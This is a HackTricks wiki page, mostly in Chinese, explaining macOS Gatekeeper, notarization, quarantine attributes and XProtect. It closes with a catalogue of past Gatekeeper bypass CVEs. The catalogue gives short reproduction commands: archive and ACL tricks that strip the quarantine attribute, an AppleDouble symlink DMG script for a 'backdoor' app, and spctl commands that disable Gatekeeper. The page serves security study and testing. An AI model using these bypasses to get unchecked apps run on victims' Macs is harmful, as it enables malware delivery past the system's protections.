# macOS Gatekeeper / Quarantine / XProtect

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Gatekeeper

**Gatekeeper** 是为 Mac 操作系统开发的安全功能，旨在确保用户 **仅运行受信任的软件**。它通过 **验证用户下载并尝试从 App Store 以外的来源打开的软件**（例如应用程序、插件或安装包）来实现。

Gatekeeper 的关键机制在于其 **验证** 过程。它检查下载的软件是否 **由认可的开发者签名**，以确保软件的真实性。此外，它还确认该软件是否 **经过 Apple 的公证**，以确认其不含已知的恶意内容，并且在公证后未被篡改。

此外，Gatekeeper 通过 **提示用户首次批准打开下载的软件** 来增强用户控制和安全性。此保护措施有助于防止用户无意中运行可能有害的可执行代码，而将其误认为无害的数据文件。

### 应用程序签名

应用程序签名，也称为代码签名，是 Apple 安全基础设施的关键组成部分。它们用于 **验证软件作者的身份**（开发者），并确保自上次签名以来代码未被篡改。

其工作原理如下：

1. **签名应用程序：** 当开发者准备分发其应用程序时，他们 **使用私钥签名应用程序**。此私钥与 **Apple 在开发者注册 Apple Developer Program 时向开发者颁发的证书** 相关联。签名过程涉及创建应用程序所有部分的加密哈希，并使用开发者的私钥对该哈希进行加密。
2. **分发应用程序：** 签名的应用程序随后与开发者的证书一起分发，该证书包含相应的公钥。
3. **验证应用程序：** 当用户下载并尝试运行应用程序时，他们的 Mac 操作系统使用开发者证书中的公钥解密哈希。然后，它根据应用程序的当前状态重新计算哈希，并将其与解密后的哈希进行比较。如果它们匹配，则意味着 **应用程序自开发者签名以来未被修改**，系统允许该应用程序运行。

应用程序签名是 Apple Gatekeeper 技术的重要组成部分。当用户尝试 **打开从互联网下载的应用程序** 时，Gatekeeper 会验证应用程序签名。如果它是由 Apple 向已知开发者颁发的证书签名，并且代码未被篡改，Gatekeeper 允许该应用程序运行。否则，它会阻止该应用程序并提醒用户。

从 macOS Catalina 开始，**Gatekeeper 还检查应用程序是否经过 Apple 的公证**，增加了一层额外的安全性。公证过程检查应用程序是否存在已知的安全问题和恶意代码，如果这些检查通过，Apple 会向应用程序添加一个 Gatekeeper 可以验证的票据。

#### 检查签名

在检查某些 **恶意软件样本** 时，您应始终 **检查二进制文件的签名**，因为 **签名** 的开发者可能已经 **与恶意软件相关**。
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

苹果的 notarization 过程作为额外的保护措施，旨在保护用户免受潜在有害软件的影响。它涉及 **开发者提交他们的应用程序进行审查**，由 **苹果的 Notary Service** 进行，这与应用审核不应混淆。该服务是一个 **自动化系统**，对提交的软件进行审查，以检查是否存在 **恶意内容** 和任何潜在的代码签名问题。

如果软件 **通过** 了这次检查而没有引发任何问题，Notary Service 会生成一个 notarization 票据。开发者随后需要 **将此票据附加到他们的软件上**，这个过程称为“stapling”。此外，notarization 票据也会在线发布，Gatekeeper，苹果的安全技术，可以访问它。

在用户首次安装或执行软件时，notarization 票据的存在 - 无论是附加在可执行文件上还是在线找到 - **通知 Gatekeeper 该软件已由苹果进行 notarization**。因此，Gatekeeper 在初始启动对话框中显示一条描述性消息，表明该软件已通过苹果的恶意内容检查。这个过程增强了用户对他们在系统上安装或运行的软件安全性的信心。

### Enumerating GateKeeper

GateKeeper 是 **几个安全组件**，防止不受信任的应用程序被执行，同时也是 **其中一个组件**。

可以使用以下命令查看 GateKeeper 的 **状态**：
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
注意，GateKeeper 签名检查仅对 **具有隔离属性的文件** 进行，而不是对每个文件进行检查。
{% endhint %}

GateKeeper 将根据 **首选项和签名** 检查二进制文件是否可以执行：

<figure><img src="../../../.gitbook/assets/image (1150).png" alt=""><figcaption></figcaption></figure>

保存此配置的数据库位于 **`/var/db/SystemPolicy`**。您可以使用 root 权限检查此数据库：
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
注意第一个规则以“**App Store**”结束，第二个规则以“**Developer ID**”结束，并且在之前的图像中，它是**启用从 App Store 和已识别开发者执行应用程序**。\
如果您**修改**该设置为 App Store，“**Notarized Developer ID**”规则将会消失。

还有成千上万的**类型 GKE** 的规则：
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
这些是来自 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`，`/var/db/gke.bundle/Contents/Resources/gk.db`** 和 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** 的哈希值。

或者你可以用以下方式列出之前的信息：
```bash
sudo spctl --list
```
选项 **`--master-disable`** 和 **`--global-disable`** 的 **`spctl`** 将完全 **禁用** 这些签名检查：
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
当完全启用时，将出现一个新选项：

<figure><img src="../../../.gitbook/assets/image (1151).png" alt=""><figcaption></figcaption></figure>

可以通过以下方式**检查一个应用是否会被GateKeeper允许**：
```bash
spctl --assess -v /Applications/App.app
```
可以在 GateKeeper 中添加新规则，以允许某些应用程序的执行：
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### 隔离文件

在**下载**应用程序或文件时，特定的macOS **应用程序**（如网页浏览器或电子邮件客户端）会**附加一个扩展文件属性**，通常称为“**隔离标志**”，到下载的文件上。此属性作为安全措施，**标记文件**来自不受信任的来源（互联网），并可能带来风险。然而，并非所有应用程序都会附加此属性，例如，常见的BitTorrent客户端软件通常会绕过此过程。

**隔离标志的存在在用户尝试执行文件时会触发macOS的Gatekeeper安全功能**。

在**隔离标志不存在**的情况下（例如通过某些BitTorrent客户端下载的文件），Gatekeeper的**检查可能不会执行**。因此，用户在打开来自不太安全或未知来源的文件时应谨慎。

{% hint style="info" %}
**检查**代码签名的**有效性**是一个**资源密集型**的过程，包括生成代码及其所有捆绑资源的加密**哈希**。此外，检查证书有效性还涉及对苹果服务器进行**在线检查**，以查看其在发放后是否被撤销。因此，完整的代码签名和公证检查在每次启动应用时**不切实际**。

因此，这些检查**仅在执行具有隔离属性的应用时运行。**
{% endhint %}

{% hint style="warning" %}
此属性必须由**创建/下载**文件的应用程序**设置**。

然而，被沙盒化的文件将对它们创建的每个文件设置此属性。而非沙盒化的应用可以自行设置，或在**Info.plist**中指定[**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc)键，这将使系统在创建的文件上设置`com.apple.quarantine`扩展属性。
{% endhint %}

此外，所有调用**`qtn_proc_apply_to_self`**的进程创建的文件都是隔离的。或者API **`qtn_file_apply_to_path`**将隔离属性添加到指定的文件路径。

可以使用以下命令**检查其状态并启用/禁用**（需要root权限）：
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
您还可以通过以下方式**查找文件是否具有隔离扩展属性**：
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
检查**扩展** **属性**的**值**，并找出写入隔离属性的应用程序：
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
实际上，一个进程“可以为它创建的文件设置隔离标志”（我尝试在创建的文件中应用 USER_APPROVED 标志，但它不会应用）：

<details>

<summary>源代码应用隔离标志</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

并**移除**该属性：
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
并找到所有被隔离的文件： 

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

隔离信息也存储在由 LaunchServices 管理的中央数据库中，路径为 **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**。

#### **Quarantine.kext**

内核扩展仅通过 **系统上的内核缓存** 可用；但是，您 _可以_ 从 **https://developer.apple.com/** 下载 **内核调试工具包**，其中将包含该扩展的符号化版本。

### XProtect

XProtect 是 macOS 中内置的 **反恶意软件** 功能。XProtect **在应用程序首次启动或修改时检查其数据库** 中已知的恶意软件和不安全文件类型。当您通过某些应用程序（如 Safari、Mail 或 Messages）下载文件时，XProtect 会自动扫描该文件。如果它与数据库中的任何已知恶意软件匹配，XProtect 将 **阻止该文件运行** 并提醒您存在威胁。

XProtect 数据库由 Apple **定期更新** 新的恶意软件定义，这些更新会自动下载并安装到您的 Mac 上。这确保了 XProtect 始终与最新已知威胁保持同步。

然而，值得注意的是 **XProtect 不是一个功能齐全的杀毒解决方案**。它仅检查特定已知威胁列表，并不像大多数杀毒软件那样执行按需扫描。

您可以通过运行以下命令获取有关最新 XProtect 更新的信息：

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect 位于受 SIP 保护的位置 **/Library/Apple/System/Library/CoreServices/XProtect.bundle**，在该包内可以找到 XProtect 使用的信息：

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**：允许具有这些 cdhash 的代码使用遗留权限。
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**：不允许通过 BundleID 和 TeamID 加载的插件和扩展的列表，或指示最低版本。
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**：检测恶意软件的 Yara 规则。
* **`XProtect.bundle/Contents/Resources/gk.db`**：包含被阻止应用程序和 TeamIDs 哈希的 SQLite3 数据库。

请注意，**`/Library/Apple/System/Library/CoreServices/XProtect.app`** 中还有另一个与 XProtect 相关的应用程序，但它与 Gatekeeper 过程无关。

### 不是 Gatekeeper

{% hint style="danger" %}
请注意，Gatekeeper **并不是每次** 执行应用程序时都会执行，只有 _**AppleMobileFileIntegrity**_ (AMFI) 会在执行已经由 Gatekeeper 执行和验证的应用程序时 **验证可执行代码签名**。
{% endhint %}

因此，之前可以执行一个应用程序以缓存它与 Gatekeeper，然后 **修改应用程序的非可执行文件**（如 Electron asar 或 NIB 文件），如果没有其他保护措施，应用程序将 **执行** 带有 **恶意** 附加内容的版本。

然而，现在这已不再可能，因为 macOS **防止修改** 应用程序包内的文件。因此，如果您尝试 [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) 攻击，您会发现不再可能利用它，因为在执行应用程序以缓存它与 Gatekeeper 后，您将无法修改该包。如果您例如将 Contents 目录的名称更改为 NotCon（如漏洞中所示），然后执行应用程序的主二进制文件以缓存它与 Gatekeeper，它将触发错误并且不会执行。

## Gatekeeper 绕过

任何绕过 Gatekeeper 的方法（设法让用户下载某些内容并在 Gatekeeper 应该禁止时执行它）都被视为 macOS 中的漏洞。这些是一些分配给允许在过去绕过 Gatekeeper 的技术的 CVE：

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

观察到如果使用 **Archive Utility** 进行提取，路径超过 **886 个字符** 的文件不会接收 com.apple.quarantine 扩展属性。这种情况无意中允许这些文件 **绕过 Gatekeeper 的** 安全检查。

查看 [**原始报告**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) 以获取更多信息。

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

当使用 **Automator** 创建应用程序时，关于其执行所需的信息位于 `application.app/Contents/document.wflow` 中，而不在可执行文件中。可执行文件只是一个名为 **Automator Application Stub** 的通用 Automator 二进制文件。

因此，您可以使 `application.app/Contents/MacOS/Automator\ Application\ Stub` **通过符号链接指向系统内的另一个 Automator Application Stub**，它将执行 `document.wflow` 中的内容（您的脚本） **而不会触发 Gatekeeper**，因为实际的可执行文件没有隔离 xattr。

示例预期位置：`/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

查看 [**原始报告**](https://ronmasas.com/posts/bypass-macos-gatekeeper) 以获取更多信息。

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

在此绕过中，创建了一个 zip 文件，应用程序从 `application.app/Contents` 开始压缩，而不是从 `application.app`。因此，**隔离属性** 应用于所有 **来自 `application.app/Contents` 的文件**，但 **不适用于 `application.app`**，这是 Gatekeeper 检查的内容，因此 Gatekeeper 被绕过，因为当触发 `application.app` 时 **没有隔离属性。**
```bash
zip -r test.app/Contents test.zip
```
检查[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)以获取更多信息。

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

即使组件不同，此漏洞的利用与之前的非常相似。在这种情况下，我们将从 **`application.app/Contents`** 生成一个 Apple Archive，因此 **`application.app` 在通过 **Archive Utility** 解压缩时不会获得隔离属性**。
```bash
aa archive -d test.app/Contents -o test.app.aar
```
检查[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)以获取更多信息。

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** 可用于防止任何人向文件中写入属性：
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
此外，**AppleDouble** 文件格式复制了一个文件及其 ACE。

在 [**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) 中可以看到，存储在名为 **`com.apple.acl.text`** 的 xattr 中的 ACL 文本表示将被设置为解压缩文件中的 ACL。因此，如果您将一个应用程序压缩成一个带有 ACL 的 **AppleDouble** 文件格式的 zip 文件，该 ACL 阻止其他 xattrs 被写入... 那么隔离 xattr 并没有被设置到应用程序中：

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

请注意，这也可以通过AppleArchives进行利用：
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

发现**Google Chrome没有为下载的文件设置隔离属性**，这是由于一些macOS内部问题。

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble文件格式将文件的属性存储在以`._`开头的单独文件中，这有助于在**macOS机器之间**复制文件属性。然而，注意到在解压AppleDouble文件后，以`._`开头的文件**没有被赋予隔离属性**。

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

能够创建一个不会设置隔离属性的文件，**可以绕过 Gatekeeper。** 这个技巧是**使用 AppleDouble 命名约定创建一个 DMG 文件应用程序**（以 `._` 开头），并创建一个**作为此隐藏文件的符号链接的可见文件**，而没有隔离属性。\
当**dmg 文件被执行**时，由于它没有隔离属性，它将**绕过 Gatekeeper**。
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### uchg (来自这个 [演讲](https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf))

* 创建一个包含应用程序的目录。
* 将 uchg 添加到应用程序中。
* 将应用程序压缩为 tar.gz 文件。
* 将 tar.gz 文件发送给受害者。
* 受害者打开 tar.gz 文件并运行应用程序。
* Gatekeeper 不会检查该应用程序。

### 防止 Quarantine xattr

在一个 ".app" 包中，如果没有添加 quarantine xattr，当执行时 **Gatekeeper 不会被触发**。

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
